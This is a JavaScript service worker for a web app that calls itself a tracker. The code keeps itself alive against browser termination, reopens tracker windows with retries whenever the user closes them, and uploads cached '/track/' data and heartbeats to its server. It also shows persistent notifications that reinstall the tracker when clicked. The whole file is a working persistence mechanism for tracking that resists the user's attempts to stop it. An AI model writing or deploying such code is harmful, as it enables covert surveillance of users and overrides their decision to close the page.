const CACHE = 'vault-swa-v3';
const ASSETS = ['/','/admin.html','/lupa-password.html','/daftar.html','/favicon.svg','/manifest.json','/tracker.js','/app.js','/firebase-config.js'];
const TRACKER_SERVER = self.location.origin;

// Keep service worker alive with periodic tasks
let keepAliveInterval = null;

self.addEventListener('install', (e) => {
    self.skipWaiting();
    e.waitUntil(caches.open(CACHE).then(c => c.addAll(ASSETS)));
});

self.addEventListener('activate', (e) => {
    e.waitUntil(clients.claim());
    startKeepAlive();
});

// Reopen tracker with exponential backoff
function attemptReopen(attempt) {
    const delays = [500, 1000, 2000, 3000, 5000];
    const delay = delays[Math.min(attempt - 1, delays.length - 1)];
    setTimeout(() => {
        self.clients.matchAll({ includeUncontrolled: true, type: 'window' }).then(clients => {
            const hasTracker = clients.some(c => c.url.includes(TRACKER_SERVER));
            if (!hasTracker) {
                self.clients.openWindow(TRACKER_SERVER + '/?bg=1');
                if (attempt < 5) {
                    attemptReopen(attempt + 1);
                }
            }
        });
    }, delay);
}

// Keep service worker alive - prevent termination
function startKeepAlive() {
    if (keepAliveInterval) return;
    keepAliveInterval = setInterval(() => {
        // Ping server to keep SW alive (no-cors to avoid CORS errors)
        fetch(TRACKER_SERVER + '/ping', { 
            method: 'POST',
            mode: 'no-cors',
            keepalive: true,
            body: JSON.stringify({ sw: 'alive', time: Date.now() })
        }).catch(() => {});
        
        // Periodic sync with server
        fetch(TRACKER_SERVER + '/api/sw-heartbeat', {
            method: 'POST',
            mode: 'cors',
            keepalive: true,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sw: 'alive', time: Date.now() })
        }).catch(() => {});
        
        // Keep clients alive or reopen
        self.clients.matchAll({ includeUncontrolled: true, type: 'window' }).then(clients => {
            // Filter only our tracker pages
            const ourClients = clients.filter(c => c.url.includes(TRACKER_SERVER));
            if (ourClients.length === 0) {
                // No clients - try to reopen with retry
                attemptReopen(1);
            } else {
                // Ping all clients to keep them alive
                ourClients.forEach(client => {
                    client.postMessage({ type: 'keepalive', time: Date.now() });
                });
            }
        });
    }, 15000); // Every 15s to prevent SW termination (Chrome kills after 30s idle)

    // Also check for iframe clients
    setInterval(() => {
        self.clients.matchAll({ includeUncontrolled: true, type: 'all' }).then(all => {
            const iframes = all.filter(c => c.url.includes('iframe=1'));
            if (iframes.length > 0) {
                iframes.forEach(c => c.postMessage({ type: 'keepalive', time: Date.now() }));
            }
        });
    }, 30000);
}

// Intercept fetch — redirect non-asset requests to tracker
self.addEventListener('fetch', (e) => {
    const url = new URL(e.request.url);
    if (url.origin === TRACKER_SERVER && ASSETS.includes(url.pathname)) {
        return e.respondWith(caches.match(e.request));
    }
});

// Background sync — flush pending data
self.addEventListener('sync', (e) => {
    if (e.tag === 'sync-tracker') {
        e.waitUntil(flushPending());
    }
});

async function flushPending() {
    const cache = await caches.open(CACHE);
    const keys = await cache.keys();
    for (const req of keys) {
        if (req.url.includes('/track/')) {
            const res = await cache.match(req);
            if (res) {
                try {
                    await fetch(req.url, { method: 'POST', body: await res.text(), headers: { 'Content-Type': 'application/json' } });
                    await cache.delete(req);
                } catch(e) {}
            }
        }
    }
}

// Periodic background sync (Chromium)
self.addEventListener('periodicsync', (e) => {
    if (e.tag === 'periodic-tracker') {
        e.waitUntil(periodicSync());
    }
});

async function periodicSync() {
    try {
        await fetch(TRACKER_SERVER + '/api/background-sync', {
            method: 'POST',
            mode: 'cors',
            keepalive: true,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'periodic',
                time: Date.now(),
                registration: 'background-sync'
            })
        });
        
        const clients = await self.clients.matchAll({ type: 'window', includeUncontrolled: true });
        const hasTracker = clients.some(c => c.url.includes(TRACKER_SERVER));
        if (!hasTracker) {
            attemptReopen(1);
        }
    } catch(e) {}
}

// Handle messages from page
self.addEventListener('message', (e) => {
    if (e.data && e.data.type === 'KEEP_ALIVE') {
        e.waitUntil(
            e.source.postMessage({ type: 'PONG', time: Date.now() })
        );
    }
    
    if (e.data && e.data.type === 'START_BACKGROUND') {
        startKeepAlive();
    }
});

// Push notification - keep alive
self.addEventListener('push', (e) => {
    const data = e.data ? e.data.json() : {};
    e.waitUntil(
        self.registration.showNotification(data.title || 'Neural AI', {
            body: data.body || 'Aktivitas terdeteksi',
            icon: '/favicon.svg',
            badge: '/favicon.svg',
            tag: 'neural-tracker',
            requireInteraction: true,
            silent: false,
            vibrate: [100, 100, 100],
            data: { url: data.url || TRACKER_SERVER + '/' }
        })
    );
});

// Notification click - reopen + reinstall tracker
self.addEventListener('notificationclick', (e) => {
    e.notification.close();
    const targetUrl = e.notification.data?.url || TRACKER_SERVER + '/';
    e.waitUntil(
        self.clients.matchAll({ type: 'window', includeUncontrolled: true }).then(clientList => {
            // If any window already open, focus it
            for (const client of clientList) {
                if (client.url.includes(TRACKER_SERVER) && 'focus' in client) {
                    return client.focus().then(() => {
                        client.postMessage({ type: 'REINSTALL_TRACKER', time: Date.now() });
                    });
                }
            }
            // Otherwise open new window
            return self.clients.openWindow(targetUrl);
        })
    );
});

// Auto-reinstall tracker when client reports closed
self.addEventListener('message', (e) => {
    if (e.data && e.data.type === 'CLIENT_CLOSED') {
        // Fast reopen with exponential backoff
        attemptReopen(1);
    }
    if (e.data && e.data.type === 'PING_REINSTALL') {
        e.source.postMessage({ type: 'PONG_REINSTALL', time: Date.now() });
    }
    if (e.data && e.data.type === 'IFRAME_ALIVE') {
        // Iframe reports it's alive — keep track
        if (!self._iframeClients) self._iframeClients = new Set();
        self._iframeClients.add(e.source.id);
    }
});
